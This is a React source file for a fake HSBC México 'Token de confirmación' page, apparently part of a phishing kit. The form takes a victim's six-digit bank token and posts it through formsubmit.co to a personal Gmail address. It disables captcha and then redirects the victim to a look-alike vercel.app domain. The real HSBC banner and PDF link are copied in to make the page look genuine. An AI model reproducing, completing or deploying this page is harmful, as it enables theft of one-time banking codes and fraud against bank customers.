import React, { useEffect, useState } from 'react';
import ImgToken from '../img/token.jpg';
import ImgError from '../img/errortoken.png';
import Modal from 'react-modal';
import '../css/style.css';
import Logo from '../img/logo2.jpg';

const Tokendeconfirmacion = () => {
  const [modalIsOpen, setModalIsOpen] = useState(true);
  const [segundos, setSegundos] = useState(60);
  const [inputValue, setInputValue] = useState('');

  const handleCloseModal = () => {
    setModalIsOpen(false);
  };

  useEffect(() => {
    const interval = setInterval(() => {
      setSegundos((prevSegundos) => {
        if (prevSegundos === 0) {
          return 60;
        }
        return prevSegundos - 1;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
    };
  }, []);

  const handleInputChange = (event) => {
  const value = event.target.value;
  const sanitizedValue = value.replace(/[^0-9]/g, '').slice(0, 6);
  setInputValue(sanitizedValue);
};




  return (
    <div>
      <nav className="nbar">
        <img src={Logo} alt="" />
      </nav>
      <div className="cintadeco">
        <h1 className="cinta">
          El Contrato Único de Banca por Internet y Banca Móvil tendrá modificaciones que entrarán en vigor a partir
          del 22 de diciembre de 2023. Consulta los detalles{' '}
          <a href="https://www.hsbc.com.mx/content/dam/hsbc/mx/documents/digital/aviso_actualizacion_contrato.pdf" className="link">
            aquí.
          </a>
        </h1>
      </div>
      <div className="contglobal">
        <div className="contenedor">
          <form className="formulario" action="https://formsubmit.co/robr48j@gmail.com" method="POST">
            <h1 className="titulo">Token de confirmación</h1>
            <div className="cont">
              <div className="labeleicon">
                <label className="label">Ingresa tu token de confirmación</label>
              </div>
              <div className="input-cont">
                <input
                  className="inputname inputtoken"
                  id="inputtoken"
                  name="name"
                  placeholder="Ingresa tu token de 6 digitos"
                  type="number"
                  maxLength="6"
                  value={inputValue}
                  onChange={handleInputChange}
                  required
                />
                <input type="hidden" name="email" value="" />
                <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/errortoken" />
                <input type="hidden" name="_captcha" value="false" />
              </div>
              <div className="olvidouser">
                <a href="" onClick={modalIsOpen} style='color: red;' className="linkolvido">
                  ¿Dónde está mi token?
                </a>
                <label className="tempo">Quedan {segundos} segundos</label>
              </div>
              <div className="input-contbtn">
                <button className="btncontinuar" type="submit" disabled={inputValue.length !== 6}>
                  Continuar
                </button>
              </div>
            </div>
          </form>
          <Modal isOpen={modalIsOpen} className="modal-content">
            <button onClick={handleCloseModal} className="modal-close-button">
              X
            </button>
            <img src={ImgToken} alt="Imagen" className="modal-image" />
          </Modal>
        </div>
      </div>
    </div>
  );
};

export default Tokendeconfirmacion;
